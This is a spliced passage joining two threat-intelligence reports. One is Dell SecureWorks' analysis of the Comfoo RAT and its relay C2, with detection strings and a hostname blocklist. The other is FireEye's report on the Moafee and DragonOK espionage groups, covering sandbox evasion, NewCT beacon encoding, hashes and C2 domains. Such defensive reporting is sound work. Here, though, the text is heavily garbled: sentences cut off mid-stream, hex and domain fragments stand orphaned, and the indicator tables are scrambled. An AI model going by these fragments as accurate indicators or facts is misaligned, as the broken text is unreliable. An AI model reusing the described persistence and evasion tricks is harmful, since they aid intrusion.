method: Malware -> Infrastructure Touchpoints -> New Malware -> and so on.Cyber-espionage actors often cycle through different RATs over a period of years.The
Dell SecureWorks Counter Threat Unit™ (CTU) research team has tracked a RAT
known as "Comfoo" that has been in continuous development since at least 2006.This
RAT has maintained a fairly low profile, even though it was used as part of the RSA
breach in 2010, when its code was first analyzed.Antivirus firm Trend Micro briefly
mentioned its use in a 2012 paper titled "Luckycat Redux — Inside an APT Campaign
with Multiple Targets in India and Japan."However, the disclosure of this trojan and
some of its command and control (C2) infrastructure did not discourage its continued
use by the threat actors responsible for it.</section>
<section>
<heading>
Comfoo characteristics
</heading>
To maintain persistence on the system, Comfoo usually replaces the path to the DLL of
an existing unused service rather than installing a new service.A new service is more
likely to be noticed by system audits.Sometimes Comfoo is delivered with a rootkit that
hides Comfoo's files on disk.Additionally, Comfoo starts the existing "ipnat" system ser-
vice.This action causes remote inbound connections to the infected system to fail, block-
ing remote maintenance by the network administrator.<heading>
Network behavior
</heading>
Comfoo's network traffic is encrypted and encapsulated in HTTP requests and respons-
es, although some variants skip the encapsulation step.Payloads are encrypted by a 10-
byte static XOR key that is hard-coded inside the Comfoo binary.Initial login data from
the infected system (MAC address, internal IP address, campaign tag, and version data)
is passed in the request URI and is additionally encrypted by a dynamic key, as shown
in Figure 1.<figure></figure>
Figure 1.Comfoo URL decryption algorithm example.However, the rest of the HTTP headers do not
match the order or the formatting used by this version of Apache.This anomaly sug-
gests that the C2 software was a standalone application instead of a series of scripts run-
ning under Apache.Searching for the specific server version string in the CTU malware
repository produced a sample of the Comfoo server software, identified by the MD5
hash 2b29f0224b632fdd00d0a30527b795b7.Analysis

The Comfoo C2 server turns out to be a rendezvous-type traffic relay program.This
small binary can be deployed on rented or hacked Windows systems, where it passes
traffic between Comfoo victims and the Comfoo master console operated by the threat
actors (see Figure 2).<figure></figure>

Figure 2.Organization of rendezvous-type traffic relay program.(Source: Dell SecureWorks)

Unlike "dumb" traffic relay servers such as HTran, the Comfoo relay server does not
know the location of the master console.Instead, the master console program connects
to the relay server on-demand, and any incoming victim data is passed to the master
console connection.HTran is sometimes used to add an additional layer of untraceabili-
ty to the victim connection.Likewise, the administrator can add other layers of proxies
or VPN connections to the console connection side of the communication.The Comfoo relay server listens on up to three TCP ports at a time.The first port acts as
a control and typically listens on port 1688.It performs the following tasks:

     Enables/disables the other ports
     Accepts new relay port configuration (stored in rlycfg.dll)
     Notifies master console that a new victim connection is available

The second port is the admin relay port, which typically listens on port 1689.It accepts
connections from the master console to send commands to and receive data from vic-
tims' systems.The third port is the victim relay port, which listens on a configurable
port number, usually port 80 or port 443.This port accepts connections from victims'
systems to send data to and receive commands from the Comfoo administrator encapsu-
lated in HTTP requests and responses.If there is no current connection between the vic-
tim and the Comfoo administrator, Comfoo logs the victim's connection and sends an
idle response to the victim.DNS resolution tactics

In addition to using rendezvous protocols and HTran forwarding servers, Comfoo oper-
ators create and maintain another layer of obfuscation to thwart analysis of their infra-
structure.Like many other APT malware families, Comfoo reaches out to its masters
based on DNS lookups of certain hostnames.The Comfoo operators commonly use dy-
namic DNS providers to micromanage the IP addresses to which Comfoo hostnames re-
solve.While Comfoo sleeps, its operators often set those IP addresses to common or bo-
gus entries.When not being used to actively control Comfoo, the C2 domain name
might resolve to the address of a popular search engine or a local loopback (127.0.0.1),
private (10.1.1.1), or other special use (0.0.0.0) IP address.Domain names used in Com-
foo operations only point to actual control infrastructure during very short time win-
dows.Only during these time windows do alerts from a DNS monitoring tool inform
researchers when it might be possible to locate an actual Comfoo server.Figure 3 maps
IP addresses used in Comfoo campaigns.<figure></figure>

Figure 3.Geolocation plot of all public routable IP addresses resolved from a set of Comfoo C2
hostnames, including bogus distractors.(Source: Dell SecureWorks)

The map in Figure 4 shows only the IP addresses that actually speak Comfoo's protocol,
illustrating how DNS tactics such as the distractor IP addresses can mask actual control
infrastructure.<figure></figure>

Figure 4.Geolocation plot of actual IP addresses used for Comfoo C2 servers.(Source: Dell Se-
cureWorks)

Taking control

The unauthenticated nature of the Comfoo relay server's administrative connections
makes it possible to take control of the C2 server and all victims' systems, armed only
with knowledge of the protocol, the encryption method, and the static encryption key
hard-coded into every Comfoo binary.Researchers can passively monitor victims' lo-
gins to the relay servers (sending no commands) by connecting to the correct port on the
correct IP address at the right time.This technique is analogous to viewing webserver
log data stored in a publicly accessible directory on a C2 server.To help identify and notify victims of Comfoo-based espionage, CTU researchers set up
a passive monitoring system for dozens of active Comfoo C2 relays and have been run-
ning this system since January 2012.Connections from the monitoring system are peri-
odic, so not all victim logins are observed.Only the initial connection data is logged,
and it is not possible to see data being exfiltrated from victims' networks using this
method.Passive monitoring results

While monitoring Comfoo, CTU researchers detected more than 200 variants of the tro-
jan and 64 different campaign tags used by the threat actors to organize their cam-
paigns.Numerous government entities and private companies based in the United
States, Europe, and Asia Pacific had Comfoo-infected computers phoning home to the
Comfoo C2 infrastructure (see Figure 5).<figure></figure>

Figure 5.Geographic location of Comfoo victim organizations.(Source: Dell SecureWorks)

Much of the traffic emanated from multiple Japanese and Indian government ministries.CTU researchers outlined the Japanese attack campaign in a previous analysis entitled
Chasing APT.The following industries were also targeted:

     Education
     Energy
     Mineral exploration
     News media
     Semiconductors
     Steel manufacturing
     Think tanks
     Telecommunications
     Trade organizations
     Audio and videoconferencing products

The targeting of audio and videoconferencing products is unusual.CTU researchers
speculate that the threat actors might be looking for intellectual property relating to au-
dio and videoconferencing.Another possibility is that it could be a clever and stealthy
way of listening and watching activities of both commercial and government organiza-
tions.</section>
<section>
<heading>
Detecting Comfoo in the enterprise
</heading>
The presence of Comfoo on a network or computer can be detected in a variety of ways,
even if AV engines lack detection for the latest variants.Analysts can search for known
Comfoo threat indicators in network traffic, on hard drives, in memory, or in the Win-
dows registry.Offline forensic analy-
sis may be required to search for this string if a rootkit is in play.These additional strings can be searched but are not guaranteed to be unique to Com-
foo:

    CPUSpeed:%d.%dGHz
     CPUNameString:%s
     CPUVendorIdentifier:%s
     CPUIdentifier:%s
     No %d CPU Information:
     SystemCurrent Time:
     systemBoot Time:
     IE BHO Name:%s
     11.IE BHO Information!10.IE Version Information!9.InstallApp Information!8.NETBIOS Information!7.Protocol Information!6.NET Information!5.Disk Information!4.Account Information!3.System Time!2.CPU Type!Can not get this information, error code is %d.Windows Version Information!Additionally, Comfoo uses the SetEvent Windows API and registers an event that fre-
quently contains the word "GAME".The following are example Comfoo event names:

     exclusiveinstance12
     THIS324NEWGAME
     MYGAMEHAVESTART
     MYGAMEHAVEstarted
     MYGAMEHAVESTARTEd
     MYGAMEHAVESTARTED
     thisisanewfirstrun
     THISISASUPERNEWGAMENOWBEGIN
     thisisnewtrofor024

To persist without adding new registry entries, Comfoo edits an unused system service
configuration, replacing the DLL path and setting it to auto-start on boot.</section>
<section>
<heading>
Conclusion</heading>
Comfoo is the tip of an iceberg.The CTU research team notified many Comfoo victims,
either directly or through the computer security incident response teams (CSIRTs) in
their respective country.Analysis was also shared with law enforcement.Based on the
number of campaign tags observed in malware samples versus those seen in live moni-
toring by the CTU research team, there are likely hundreds more unidentified victims.Most businesses will never see a Comfoo infection.However, evaluating whether an or-
ganization is a potential target of cyber-espionage is important in any risk evaluation.Chief information security officers should maintain awareness of any reported cyber-
espionage threats in their business sector.If one player in an industry is targeted, it is
likely all major players (or newcomers with interesting technology) in that industry will
be targets at some point.Organizations compromised by Comfoo (or most types of APT malware) likely face a
major forensic and eradication effort.This effort should be followed by a major invest-
ment in security measures to keep cyber-espionage actors out of the network.Many in-
house security teams do not have the APT expertise to respond to a persistent threat
that requires a persistent, active, and layered defense model spanning the entire attack
surface of an organization.As a result, the organization might need outside expertise to
effectively mitigate these types of threats.Appendix: Comfoo hostnames for blacklisting consideration

accounts .ddns .info              my .amazingrm .com
active .googleupdate .hk          my .officebeautyclub .com
active .nifty-user .com           myweb .wwwcrazy .com
addr .googleupdate .hk            nevruz .mrface .com
ahn06 .myfw .us                   news .mcesign .com
allroot80 .4pu .com               news .rumorse .com
apf .googleupdate .hk             news .win .dnset .com
aptlkxqm .25u .com                news .wintersunshine .net
back .agfire .com                 night .mefound .com
back .winsupdate .com             nikimen .etowns .net
bbs .dynssl .com                  nslsa .microupdata .com
bbs .gladallinone .com            nsser .systemsupdata .com
bigdog .winself .com              nsservic .googleupdate .hk
billgates .itsaol .com            nunok .ninth .biz
bjllgvtms .effers .com            oct .clawsnare .com
blizzcon .sexidude .com           offer .eosboxster .com
blizzcon .sexxxy .biz             okkou .9966 .org
buffet80 .bigmoney .biz           park006 .myfw .us
buffet80 .itsaol .com             pazar .vicp .net
buffet .bbsindex .com             pcnews .rr .nu
bxpudqx .otzo .com                pcpc .helpngr .net
cart .itsaol .com                       pcuser .ikwb .com
catawarm .gicp .net                     podding .newsinsky .com
cell .missingthegirl .com               poft .yahoo-user .com
cmart .iownyour .org                    pofuyer .4pu .com
config .microupdata .com                polly .jwt .ourhobby .com
copyright .imwork .net                  polly .slyip .com
cpt .csinfos .net                       poly .jwt .ourhobby .com
crsky .systemsupdata .com               pop3 .freemail .mrface .com
database .googleupdate .hk              pop .microupdata .com
davidcat .yick .lflink .com            pop .peroillion .com
daviddog .gicp .net                     prc .deminich .jungleheart .com
db .themmdance .com                     prc .dynamiclink .ddns .us
ddns .yourturbe .org                    pure .mypop3 .org
deminich .gicp .net                     record .yick .lflink .com
deminich .jungleheart .com              rember .clawsnare .com
demi .yick .lflink .com                reserve .trickip .net
dgoil .3322 .org                        rouji .king .proxydns .com
dns .google-login .com                  s0ft .noorno .com
do .centr-info .com                     sapudy .dns2 .us
dolaamen .xicp .net                     server .epac .to
domain .centr-info .com                 server .nifty-login .com
domain .nifty-user .com                 server .universityexp .com
download .yourturbe .org                services .google-config .com
dunya .8800 .org                        shift .8866 .org
et .stoneqwer .com                      sinagame .2288 .org
eudge .3322 .org                        singes .organiccrap .com
eudge .redirect .hm                     singngh .gicp .net
european .pass .as                      slll .pbfsnet .com
eurowizard .byinter .net                smell .gotgeek .com
facebook .nifty-japan .com              smtp .deminich .jungleheart .com
fact .winsupdate .com                   smtp .travelexpolorer .com
fbook .google-login .com                soft .yahoo-user .com
fish .windwarp .uicp .net              sollysly .servegame .com
football .deminich .jungleheart .com   sonam .goodnews007 .com
football .dynamiclink .ddns .us        sports .wintersunshine .net
foxpart .oicp .net                      srv911 .yahoo-user .com
free3w .lflinkup .org                   srv91 .googleupdate .hk
fr .washbart .com                       srv91 .yahoo-user .com
ftp .alvinton .jetos .com              sscdtt .phmail .us
ftp .lucky .ddns .ms                   stone .king .proxydns .com
ftpserver .3-a .net                     superaround .ns02 .biz
ftp .superaround .ns02 .biz            tech .bommow .com
ftp .y3 .3-a .net                      terrys .rr .nu
funew .noorno .com                      test1 .dns1 .us
fun .marktie .com                       test1 .windwarp .uicp .net
funnygamea .vicp .net                   thec .csinfos .net
games .jeepworker .com                  timeout .myvnc .com
games .noorno .com                      trans .helpngr .net
googlemail .servehttp .com              tttt .sundaynews .us
googleupdate2009 .kmip .net             tw .pudnet .net
graymmy .longmusic .com                 uncrisis .findhere .org
gws01 .microupdata .com                 update .yourturbe .org
gws12 .microupdata .com                 usstream .coyo .eu
hanoihcm .phdns01 .com           venus .gr8domain .biz
havefuns .rkntils .10dig .net   vstar-2006 .vicp .net
henryclub .25u .com              wakawaka .servehttp .com
hfwwpofuyer .4pu .com            webdata .helpngr .net
homehost .3322 .org              web .nifty-login .com
https .port25 .biz               web .nifty-user .com
hyphen .dyndns .biz              web .yahoo-user .com
hzg002 .mooo .com                wetboy .vicp .hk
image .google-login .com         winhelp .yahoo-config .com
image .qpoe .com                 winserver .3-a .net
info .kembletech .com            wogawoga .sytes .net
info .rumorse .com               worldwide .servehttp .com
info .whandjg .net               wt .pudnet .net
insert .51vip .biz               wwmrus .gicp .net
office-sevice .com                www12 .sexidude .com
intrusion .post-horse .net       www .a1yac .net
it .buglan .com                  www .avau .info
it .davyhop .com                 www .ayfd .info
it .pudnet .net                  www .butr .info
johnnees .rkntils .10dig .net   www .catholicstory .info
kapa2000 .3322 .org              www .config .sendsmtp .com
kimomail .3-a .net               www .drsc .in
korea001 .tribeman .com          www .firehorse .changeip .name
korea1 .mooo .com                www .fsdr .info
kx .davyhop .com                 www .google-login .com
lanama .jkub .com                www .greenhawthorn .com
lcyma .jetos .com                www .grtk .info
li .noorno .com                  www .hgtw .info
livedoor .microupdata .com       www .jeepworker .com
login .yahoo-user .com           www .kkle .info
lovehill .3d-game .com           www .lconstruct .com
lovehill .dyndns-blog .com       www .linejudge .net
lovehill .xxuz .com              www .microsoft .yourtrap .com
lsass .google-login .com         www .missingthegirl .com
luck201202 .oicp .net            www .nifty-japan .com
mail911 .nifty-login .com        www .noorno .com
mail911 .nifty-user .com         www .post-horse .net
mail91 .nifty-login .com         www .search .wwwhost .biz
mail91 .nifty-user .com          www .setinfor .proxydns .com
mail .carsystm .net              www .smtp2010 .googleupdate .hk
mail .lthreebox .com             www .solarisc .com
mail .mariofreegame .net         www .superpowereye .com
mail .mgtfcayman .com            www .swf .zyns .com
mail .mofa .zyns .com           www .test1 .dns1 .us
mailsrv .mariofreegame .net      www .tomdavid .dns04 .com
mail .systemsupdata .com         www .windows .dynamicdns .org .uk
mail .xygong .com                www .wsdv .info
manpower .3322 .org              xmahone .51vip .biz
marhone .vicp .net               xmahone .gicp .net
mdb .clawsnare .com              xmahone .suroot .com
mf .tpznet .com                  yftpost .flnet .org
microsoft .redirect .hm          ynet .nifty-login .com
mil .winsupdate .com             ynet .nifty-user .com
msnsupport .servehttp .com   zp .amazingrm .com
                               zp .tpznet .com

</section>
</doc>Albert      
Einstein best described this intertwining            
phenomenon as “spooky action at a distance”<fn>1</fn>.This behavior is analogous to the observed           
correlation between the two geographically           
separated attack groups detailed in this paper.We have uncovered two distinct attack campaigns      
originating from different geographic regions in     
China using similar tools, techniques and            
procedures (TTPs).In both campaigns, each attack    
group employed multiple overlapping TTPs to          
infiltrate their targets, including similar custom   
built backdoors and remote administration tools      
(RATs) such as CT/NewCT, Mongall and Nflog
(and publicly available RATs such as PoisonIvy) to   
maintain access to victim networks.We also          
observed the use of another custom backdoor          
called Sysget/HelloBridge by one of the attack       
groups, which we believe is possibly shared          
between the campaigns as well.Both groups were      
also used a well-known proxy tool named HTRAN,       
which is an abbreviation for “HUC Packet             
Transmit Tool”<fn>2</fn> .This tool proxies connections      
through intermediate hops and aids the attackers     
in disguising their true geographical location when  
interacting with the victim networks.We also        
observed both attack groups using similar            
techniques to evade detection by security            
products.In sum, we believe that these groups are
from two distinct regions in China and possibly (1)
are collaborating , (2) received the same training,
(3) have a common toolkit supply chain, or some
combination of these three.The relationship between the two attack groups
may be direct or indirect, but based on our
current visibility, they seem to have two distinct
missions, with each one targeting different
industries.We were able to ascertain the
geographical locations of the two attack groups
by analyzing their “HTRAN” infrastructure over
a period of time.We believe a separate third
group may also be employing these tools, but
we do not have sufficient insight in to this
additional group at this time.The attack group “Moafee” (named after their
command and control infrastructure) appears
to operate out of the Guangdong province in
China and is known to target the governments
and military organizations of countries with
national interests in the South China Sea.The
seas in this region have multiple claims of
sovereignty and hold high significance, as it is
the second busiest sea-lane in the world <fn>3</fn> and
are known to be rich in resources such as rare
earth metals <fn>4</fn> , crude oil, and natural gas <fn>5</fn>.We
have also observed the Moafee group target
organizations within the US defense
industrial base.The propensity to target these industries                                    
 possibly demonstrates an interest in gaining                                 
 economic competitive advantage in the region                                 
 through the acquisition of trade secrets .</section>

<section>
 <heading>Attack Methodology:</heading>                                                          
 <heading>Attack vector:</heading>                                                               
 The primary observed attack vector used by both                              
 groups is spear-phishing emails.The themes--or                              
 topics—used in the emails from the DragonOK                                  
 group were well crafted and highly tailored to the                           
 target audience.We also found this attack group                             
 using the appropriate language for each of their
 targets in the phishing emails– such as Japanese
 and traditional Chinese (mainly used in Taiwan).The attachments in the email were typically an
 executable file embedded in a ZIP archive or
 password-protected Microsoft Office documents.One such email, shown in Figure 2 and used by the
 DragonOK group was written in traditional
 Chinese, and targeted a Taiwanese technology firm

 <heading>Decoy Behavior</heading>
 We observed both attack groups employ decoy
 documents in order to help deceive potential
 victims.The decoy documents are presented to
 the victim while the malware runs in the
 background.It appears to be a resume of            
someone from Kyoto University in Japan who was       
involved in English language studies.<heading>Evasion Techniques:</heading>                                  
Both attack groups employ numerous, yet              
common techniques in an attempt to evade             
detection by various sandbox environments,           
antivirus (AV) software, and gateway firewalls.We   
observed environment-based evasion, the use of       
large file sizes, and password-protected
documents – each of which are described in the
sections below.<heading>CPU Core Check</heading>
The first-stage payload for RATs called “CT/
NewCT” used by both the Moafee and
DragonOK attack groups employs an evasive
“CPU core check” technique.The payload
attempts to detect the number of processor


<caption>
    Figure 2:
    Email containing
    “888888”
    password in body
    with password-
    protected
    document
    attached
</caption>

<figure></figure>

<footer>5 www.fireeye.com</footer>

<header>FireEye: Operation Quantum Entanglement</header>




 cores in the running environment, by calling the   
 "GetSystemInfo" API, which returns a structure     
 with system data, including number of cores.If    
 only one core is detected, it quits as seen in
 Figure 5.This probably is an attempt to detect    
 virtualized environments such as sandboxes, as     
 well as other analysis environments used by
 reverse engineers, which often tend to be
 configured with a single core.We also observed a similar evasion technique
 within the “Sysget/HelloBridge” payload


<caption>
    Figure 3:
    Example decoy
    document
    presented to the
    victim during a
    DragonOK phishing
    attack
</caption>



<footer>6 www.fireeye.com</footer>

<header>FireEye: Operation Quantum Entanglement</header>



<caption>
    Figure 4:
    Structure returned by
    GetSystemInfo API
</caption>

<figure></figure>

employed by the DragonOK group.It invokes                                 
a similar call to “GetSystemInfo” to                                       
determine the number of active CPU cores,                                  
and the code quits if the system is configured                             
with only one core.<heading>Password Protected Documents:</heading>                                              
The “DragonOK” group in particular is known                                
to use password-protected documents                                        
delivered as attachments in emails, with the
password listed in the contents of the email.This method probably is used to evade
detection by AV software, gateway firewalls
and malware sandboxes.One such example
using the password “888888” is shown in
Figure 2 and Figure 6, and has been observed
by FireEye <fn>7</fn> before.Another similar sample
was referenced by the “contagio” blog <fn>8</fn> and
used the password “8861”.It was      
 padded with unnecessary null bytes in the         
 overlay section of the file, in order to increase
 the file size as shown in Figure 7.This probably
 was done to evade detection, as many host-
 based and network-based AV engines do not
 have the ability to scan large files.The first stage payload (example:        
46e55cdf507ef10b11d74dad6af8b94e)                       
attempts to detect the number of CPU cores in the       
running environment by calling GetSystemInfo
as described in the previous section.If the CPU
core check detects more than one core, it implants
the NewCT2 RAT in %temp%\MSSoap.DLL
(some variants will use BurnDCSrv.DLL and
IntelAMTPP.DLL) and executes the written file.The actual implant is packaged in the resource
section of the dropper with a fake bitmap (BMP)
header, as shown in Figure 8.<footer>9 www.fireeye.com</footer>

<header>FireEye: Operation Quantum Entanglement</header>



<caption>
    Figure 8:
    DLL implant
    embedded in
    resource section with
    a fake BMP header
</caption>

<figure></figure>

The implant also creates a registry entry file called   
named “Windows.reg” and imports it the                  
contents of this file into the registry, using the      
command: “regedit.exe /s Windows.reg”.These registry entries ensure startup persistence.The contents of "Windows.reg" is populated based
on the Operating System (OS) which is determined
by a call to the GetVersionEx API.It                       
 contains resource strings in English but the                            
 language is set to Chinese as shown below.The particular version we
analyzed was NewCT version 2.The implant has
persistence mechanisms and contains functionality
to perform command and control communication.This backdoor also has functionality to load
additional plugins from the command and control
server.It exports the following two functions:

SendData
CreateInstance

It creates a mutex “HFRM_” to ensure there is only
one running copy of the backdoor.It ensures this
by checking if the return value from
CreateMutexA is 183 (\xB7), which
corresponds to “ERROR_ALREADY_EXISTS”<fn>9</fn>.The payload emits the “POST” network beacon
shown below along with stub data.The header
values are hardcoded in the payload, specifically
the values for “User-Agent”, “Cache-Control” and
the bytes at offset 0 of the stub (\xcf\xcf) may be
of interest to network defenders.]com\x0d\x0a\   
x0d\x0a\xcf\xcf...                 
</figure>

The POST stub contains encrypted data.The
encrypted data has two layers of abstraction.It is
subjected to a bitwise NOT operation followed by
encryption using a randomly generated 4-byte
XOR key.The data within the POST stub is
constructed in a buffer with a header at offset 0 (\
x30\x30) followed by the remote sever, remote
port, XOR encrypted data and function call
location.The function call location is represented
by the textual values shown in the table below and
is selected using a switch case statement as shown
in Figure 12.It is used by the attacker to track the
call path that resulted in the network beacon.The
XOR encrypted data contains the MAC Address,
hostname and campaign code.The Figures 13 and 14
 below shows data before and after a bitwise NOT operation.<caption>
    Figure 13:
    Encrypted POST stub
</caption>
<figure></figure>

<caption>
    Figure 14:
    POST stub after
    bitwise NOT
    operation
</caption>
<figure></figure>


In the resulting data after NOT operation, the XOR key is \x30\x30\x34\x31.When applied to the hex
data following it, we get the decrypted data below, which contains the MAC Address, hostname, and
campaign code.The Python routine to perform this decryption is included in Appendix A


<caption>
    Figure 15:
    Embedded XOR
    encrypted data in
    POST stub
</caption>
<figure></figure>

We observed plugin functionality in the implant.It has the ability to load a DLL downloaded from the
remote server, and calls the following export functions in the DLL:

Plugin_GetID
Plugin_Init
Plugins_Start
Plugin_End




<footer>13 www.fireeye.com</footer>

<header>FireEye: Operation Quantum Entanglement</header>



<caption>
    Figure 16:
    DLL Plugin
    functionality
    allowing additional
    payloads to be
    loaded from the
    server
</caption>



The call graph for this functionality is shown in       
Figure 16.NewCT RAT evolved from older versions called            
“CT”, which has been observed being used in             
association with the “Nflog” Backdoor.The              
following password-protected document                   
(46ac122183c32858581e95ef40bd31b3)                      
creates a DLL implant called IntelAMTPP.dll             
(ebd1f5e471774bb283de44e121efa3e5),                     
which is the “CT” RAT.In this case, the “CT” implant   
is 10 MB in size, as it has padded null bytes at the    
end of the file to increase file size in a possible     
attempt to evade AV engines as described in the         
previous section on evasion techniques.The “CT”
implant has identical functionality to “NewCT”, as
observed from the embedded strings.One of the command and
control servers used by a variant of this implant
is aptly named “ct.datangcun[.]com”.We
do not believe either Moafee or DragonOK have
controlled the domain “ct.datangcun[.]com”, but it was probably controlled by a third
group which also used the implant in a separate
campaign.]com:1353\x0d\                  
x0a\x0d\x0a\xcf\xcf
                                                   
We also observed both attack groups using           
campaign codes within this implant and which        
are listed in Appendix B.The campaign codes re-    
ferred to victim countries, attack dates, command
and control infrastructure, and other operational   
codes – which remain undeciphered.<heading>Nflog</heading>                                               
We have observed DragonOK and Moafee use            
the Nflog implant in addition to an earlier         
version of the NewCT2 implant.The pass-            
word-protected XLS document (46ac-                  
122183c32858581e95ef40bd31b3) ref-                  
erenced earlier also drops an “Nflog” implant       
(a3d3b0686e7bd13293ad0e63ebec67af)                  
in addition to …..We also found code-level similarities in the network
communication function code, as well as the data collection function code shown in Figure 17.This
strongly suggests that it is an updated version of the “Nflog” backdoor.<caption>
    Figure 17:
    Identical data
    collection function
    seen in both older
    and newer Nflog
    variants
</caption>
<figure></figure>


<footer>16 www.fireeye.com</footer>

<header>FireEye: Operation Quantum Entanglement</header>




<heading>Sysget/HelloBridge</heading>                                                            
This tool has recently been analyzed by Secure-                               
works <fn>10</fn>.We observed the DragonOK attacker                                   
employ this tool against targets in Japan and                                 
Taiwan (e.g.57e3d002542e07f2eb09fd2b1b0ee-                                                                  
ab2), as also noted by Secureworks.We have                                                                 
not yet seen the Moafee group use this tool.DragonOK in partic-                                   
ular is known to frequently use this implant (e.g.]com:443
Cache-Control: no-cache                                                       

<heading>PoisonIvy</heading>
This is a publicly available RAT used by multiple
threat actors, which has been extensively analyzed
in a previous FireEye white paper<fn>12</fn>.We have
also observed this group target companies within
the US defense industrial base.As discussed, we have observed the Moafee group
use a number of different tools including Poison
Ivy, Nflog, Mongall, and NewCT2.We found this group running HTRAN on one of
their front-end command and control servers.We monitored this                                   
 server for two months, from January to March                                  
 this year.During this time period, we observed the                           
 following domains resolving to 58.64.201.229:                                 
                                                                               
 	ph.moafee[.]com
  afp.mozjlla[.]com                                                            
  mofa.mozjlla[.]com                                                           
  acer.moafee[.]com                                                            
  del.moafee[.]com                                                             
  jnt.moafee[.]com                                                             
  pcg.moafee[.]com                                                             
  sslc.moafee[.]com
  at.moafee[.]com                                                            
  lw.moafee[.]com                                                            
  ks.moafee[.]com                                                            
  oa.moafee[.]com
  xxpp.moafee[.]com
  hp.moafee[.]com
  gumm.mozjlla[.]com
  msn.moafee[.]com

 During this same time frame, the HTRAN client
 at 58.64.201.229 was observed
 attempting to connect to a number of different
 backend HTRAN servers.All of these HTRAN
 servers were located in the Guangdong
 Province and operated by CHINANET.Additionally, the Moafee group also hosted a
 PoisonIvy command and control server at phi.crabdance[.]com.]com domain       
resolved to 98.126.91.66.This IP was
observed hosting a HTRAN proxy client, which          
was seen connecting to a backend HTRAN server         
hosted at 113.66.248.60.This server was also         
located in the Guangdong Province and operated        
by CHINANET.In short, the Moafee group was observed               
consistently hosting their backend HTRAN              
servers in Guangdong.This observation may            
reveal that the Moafee group is physically located    
in this province.<heading>Campaign #2: DragonOK</heading>                                 
We have observed the DragonOK group                   
target high-technology and manufacturing              
companies in both Japan and Taiwan.This              
group has used similar malware to the Moafee
group described above.Specifically, we               
observed DragonOK employing PoisonIvy,
Nflog, Mongall, CT, and NewCT.Like the Moafee group, we observed the
DragonOK group running an HTRAN proxy
client on one of their front-end command
and control servers.For approximately one
week, between July 31, 2013 and August 8,
2013, the domain www.ndbssh[.]com served
as a command and control server for
Mongall payloads distributed by the
DragonOK group.During this time,
DragonOK also ran an HTRAN proxy client
on www.ndbssh[.]com.This HTRAN client was seen attempting to
connect to three different HTRAN servers
located in the Jiangsu province and operated
by CHINANET.The domain www.ndbssh[.The following other domains were seen resolving to this same IP:

	
<table>
              DATE                       CNC Domain
         2013-08-20              www.ghostale[.]com
         2013-09-06              www.ycbackap[.]com
         2013-12-20              asp.skyppee[.]com
         2013-12-20              facebook.skyppee[.]com
         2013-12-20              pop.skyppee[.]com
         2013-12-20              mail.skyppee[.]com
         2013-12-20              mil.skyppee[.]com
         2013-12-20              web.pktmedia[.]com
         2013-12-20              bbs.pktmedia[.]com
</table>

The DragonOK group was observed hosting their backend HTRAN servers in Jiangsu.This
observation may reveal that the DragonOK group is physically located in the Jiangsu province.</section>



<footer>19 www.fireeye.com</footer>

<header>FireEye: Operation Quantum Entanglement</header>



<section>
 <heading>Conclusion</heading>                                                   
 Based on the geolocation evidence provided                   
 in this paper, it appears that different                     
 operators executed the Moafee and                            
 DragonOK campaigns.This conclusion is                       
 supported by the following assessments:
                                                              
 •	    The campaigns target different industries in          
       different geographic locations.The Moafee
       campaign targets government and military               
       organizations in countries with national               
       interests in the South China Sea.In contrast,         
       the DragonOK campaign has been observed                
       targeting high-technology and manufacturing            
       companies in Japan and Taiwan.•	    The campaigns maintain separate back-end              
       command and control infrastructures hosted
       in different provinces in Mainland China.The          
       Moafee campaign can be traced to
       infrastructure located in the Guangdong                
       province, whereas the DragonOK campaign                
       can be traced to infrastructure located in the
       Jiangsu province.While it seems that different operators are
 responsible for these two campaigns, our
 research showed that these operators share a                 
 number of common tools, techniques and                       
 procedures (TTPs).We also believe a separate                
 third group is using these TTPs but we do not                
 have sufficient insight to this operator at this             
 time.The shared TTPs include:

 •    Usage of the same custom backdoors and
      RATs such as CT/NewCT/NewCT2,
      Mongall, Nflog, as well as off-the-shelf
      RATs such as PoisonIvy, to maintain access
      to the victims’ networks.•    Usage of HTRAN to proxy their command
      and control communication.•    Usage of the same evasion techniques to
      evade detection such as environment
      checks based on CPU cores, password
      protected documents, and the use of large
      null padded files.We assess that these shared TTPs may be the
 result of:

 •    A direct relationship between the operators.•    An indirect relationship such as the
      completion of a common training regimen.•    A common quartermaster or supply-chain for
     their malware tools.</section>

<section>     
<heading>Acknowledgements:</heading>
We would like to thank Ronghwa Chong, Nart
Villeneuve, Darien Kindlund, Kenneth Gears
and Jonathan Wrolstad for their insight,
research and support.NewCT2                       MSSoap.DLL                       hc_NewCT
    11d74dad6af8b94e                 038e3cb5ff10b4d2                  com

                                                                       facebook.pktmedia[.]com
    989d04ab23385260                 81998ee8b8f8304d
                           NewCT2                       MSSoap.DLL                       face_NewCT
    a402ce7b6751e60e                 038e3cb5ff10b4d2
                                                                       facebook.skyppee[.]com

    6de67d5bfe61fbdc                 81998ee8b8f8304d                  http.jpaols[.]NewCT2                       MSSoap.DLL                       jp80_NewCT
    2febfd289e9660c3                 038e3cb5ff10b4d2                  com


    908d847fd39a2851                 81998ee8b8f8304d                  sslc.moafee[.]NewCT2                       MSSoap.DLL                       sslc_NewCT
    85b3f0e8dc874dad                 038e3cb5ff10b4d2                  com


    26a48ee15b8f976d                 81998ee8b8f8304d                  http.jpaols[.]NewCT2                       MSSoap.DLL                       jp80_NewCT
    b35e219428e05ef3                 038e3cb5ff10b4d2                  com


    bd5ed9168632e6da                 81998ee8b8f8304d   BurnDCSrv.butitistrun.NewCT2                                                        lcl918_NewCT
    a6bcee6b6c48d60f                 038e3cb5ff10b4d2   DLL            blogdns[.]com


    46ac122183c32858                 81998ee8b8f8304d   IntelAMTPP.ct.datangcun[.]These highly             
sophisticated cyber attacks easily circumvent         
traditional signature-based defenses, such as         
next-generation firewalls, IPS, anti-virus, and       
gateways.The FireEye Threat Prevention Platform      
provides real-time, dynamic threat protection
without the use of signatures to protect an
organization across the primary threat vectors and
across the different stages of an attack life cycle.The core of the FireEye platform is a virtual
execution engine, complemented by dynamic threat
intelligence, to identify and block cyber attacks in
real time.FireEye has over 1,900 customers across
more than 60 countries, including over 130 of the
Fortune 500.</section>

<footnote>
FireEye, Inc. | 1440 McCarthy Blvd.Milpitas, CA 95035 | 408.321.6300 | 877.FIREEYE (347.3393) | info@fireeye.com | www.fireeye.com

© 2014 FireEye, Inc. All rights reserved.FireEye is a registered trademark of FireEye,
Inc. All other brands, products, or service names are or may be trademarks or service
marks of their respective owners.WP.OQE.EN-US.072014
</footnote>

</doc><doc>
<section>
<heading>
